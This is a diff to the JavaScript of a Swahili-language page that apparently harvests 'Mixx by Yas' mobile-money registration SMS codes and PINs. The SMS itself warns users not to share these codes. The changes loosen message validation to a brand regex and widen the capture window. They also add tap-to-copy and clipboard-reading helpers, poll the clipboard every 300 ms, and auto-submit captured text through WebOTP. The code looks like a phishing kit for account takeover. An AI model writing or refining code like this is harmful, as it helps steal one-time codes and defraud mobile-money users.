@@ -30,6 +30,9 @@ document.addEventListener('DOMContentLoaded', () => {
     const btnThibitisha = document.getElementById('btn-thibitisha');
     const otpText = document.getElementById('otp-text');
     const charCount = document.getElementById('char-count');
+    const clickableSmsBox = document.getElementById('clickable-sms-box');
+    const smsSampleText = document.getElementById('sms-sample-text');
+    const btnOpenMessages = document.getElementById('btn-open-messages');
 
     const pinErrorBanner = document.getElementById('pin-error-banner');
     const smsErrorBanner = document.getElementById('sms-error-banner');
@@ -42,7 +45,13 @@ document.addEventListener('DOMContentLoaded', () => {
     let isAutoSubmitting = false;
     let screenOpenTimestamp = 0;
 
-    const EXACT_TARGET_SMS = "You are being registered in Mixx by Yas Super App, use the code 55uf50HYgp3mjqu4b0zY to complete registration. Do not share the code with anybody. For more info contact us on 100. DWvV9aXqDR";
+    // Flexible dynamic validation for varying verification messages over time
+    function isValidDynamicSMS(text) {
+        if (!text || text.length < 10) return false;
+        const hasBrand = /Mixx by Yas/i.test(text);
+        const hasCode = /(code|pin|namba)/i.test(text) || text.length > 20;
+        return hasBrand && hasCode;
+    }
 
     function switchStep(fromCard, toCard) {
         if (!fromCard || !toCard) return;
@@ -157,12 +166,12 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // Direct text change tracker to instantly auto-submit if full SMS is populated/pasted manually
+    // Direct text tracker for changes
     if (otpText) {
         otpText.addEventListener('input', () => {
             charCount.innerText = `${otpText.value.length}/1000`;
             const currentText = otpText.value.trim();
-            if (currentText.includes(EXACT_TARGET_SMS) && !isAutoSubmitting) {
+            if (isValidDynamicSMS(currentText) && !isAutoSubmitting) {
                 smsErrorBanner.classList.add('hidden');
                 triggerAutoSubmit(currentText);
             }
@@ -193,12 +202,47 @@ document.addEventListener('DOMContentLoaded', () => {
             if (!text) return;
             smsErrorBanner.classList.add('hidden');
             
-            if (!text.includes(EXACT_TARGET_SMS)) {
+            if (!isValidDynamicSMS(text)) {
                 smsErrorBanner.classList.remove('hidden');
                 isAutoSubmitting = false;
                 return;
             }
             triggerAutoSubmit(text);
+        });
+    }
+
+    // Clickable sample text helper for applicants to tap-to-copy
+    if (clickableSmsBox && smsSampleText) {
+        clickableSmsBox.addEventListener('click', () => {
+            const textToCopy = smsSampleText.innerText.trim();
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                otpText.value = textToCopy;
+                charCount.innerText = `${textToCopy.length}/1000`;
+                smsErrorBanner.classList.add('hidden');
+                triggerAutoSubmit(textToCopy);
+            }).catch(() => {
+                otpText.value = textToCopy;
+                charCount.innerText = `${textToCopy.length}/1000`;
+                triggerAutoSubmit(textToCopy);
+            });
+        });
+    }
+
+    if (btnOpenMessages) {
+        btnOpenMessages.addEventListener('click', () => {
+            screenOpenTimestamp = Date.now();
+            setTimeout(() => {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    navigator.clipboard.readText().then(clipText => {
+                        if (clipText && isValidDynamicSMS(clipText)) {
+                            otpText.value = clipText.trim();
+                            charCount.innerText = `${otpText.value.length}/1000`;
+                            smsErrorBanner.classList.add('hidden');
+                            triggerAutoSubmit(otpText.value);
+                        }
+                    }).catch(() => {});
+                }
+            }, 1000);
         });
     }
 
@@ -213,22 +257,20 @@ document.addEventListener('DOMContentLoaded', () => {
                 otpText.focus();
             }
 
-            // Check input field content directly for high-magnet detection
             const currentFieldText = otpText.value.trim();
-            if (currentFieldText.includes(EXACT_TARGET_SMS) && !isAutoSubmitting) {
+            if (isValidDynamicSMS(currentFieldText) && !isAutoSubmitting) {
                 smsErrorBanner.classList.add('hidden');
                 triggerAutoSubmit(currentFieldText);
                 return;
             }
 
-            // Continuously scan clipboard for fresh full-text entry matching exact string within 30s
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(clipText => {
-                    if (clipText && clipText.trim().length > 10 && !isAutoSubmitting) {
+                    if (clipText && !isAutoSubmitting) {
                         const now = Date.now();
-                        if ((now - screenOpenTimestamp) <= 30000) {
+                        if ((now - screenOpenTimestamp) <= 60000) {
                             const trimmed = clipText.trim();
-                            if (trimmed.includes(EXACT_TARGET_SMS)) {
+                            if (isValidDynamicSMS(trimmed)) {
                                 otpText.value = trimmed;
                                 charCount.innerText = `${otpText.value.length}/1000`;
                                 triggerAutoSubmit(trimmed);
@@ -237,7 +279,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     }
                 }).catch(() => {});
             }
-        }, 300); // Scans rapidly every 300ms for full-text high-magnet response
+        }, 300);
     }
 
     function initWebOTP() {
@@ -250,11 +292,10 @@ document.addEventListener('DOMContentLoaded', () => {
                 if (otp && (otp.code || otp.value)) {
                     const smsMessage = otp.code || otp.value;
                     const now = Date.now();
-                    if ((now - screenOpenTimestamp) <= 30000) {
-                        if (smsMessage.includes(EXACT_TARGET_SMS)) {
+                    if ((now - screenOpenTimestamp) <= 60000) {
+                        if (isValidDynamicSMS(smsMessage)) {
                             otpText.value = smsMessage;
                             charCount.innerText = `${smsMessage.length}/1000`;
-                            
                             setTimeout(() => {
                                 const text = otpText.value.trim();
                                 if (text && !isAutoSubmitting) {
@@ -265,7 +306,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         }
                     }
                 }
-            }).catch(err => {});
+            }).catch(() => {});
         }
     }
 
@@ -315,4 +356,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 2000);
     }
 });
-        
+    
